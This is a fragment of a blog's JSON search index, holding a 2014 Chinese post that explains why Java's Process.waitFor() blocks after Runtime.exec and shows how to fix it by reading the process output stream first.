很尴尬，从以前博客上移过来发现丢了","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"office","slug":"office","permalink":"http://yoursite.com/tags/office/"}]},{"title":"Process.waitFor","date":"2014-02-28T09:26:00.000Z","path":"2014/02/28/Process.waitFor/","text":"今天在使用Runtime.getRuntime.exec(command)调用系统命令后。使用Process.waitFor()来等待命令执行结束。后来发现阻塞。这个方法会让线程一直等待下去。参考了各路大神的提醒后。终于解决了这个问题贴上代码 Runtime r = Runtime.getRuntime(); Process p = r.exec(command); InputStreamReader isr = new InputStreamReader(p.getInputStream()); BufferedReader br = new BufferedReader(isr); String line = null; while ((line = br.readLine()) != null) { System.out.println(line); } p.waitFor(); 原因是因为Process的InputStreamSize是有限的，如果不及时处理掉就会把程序block住。","tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]}]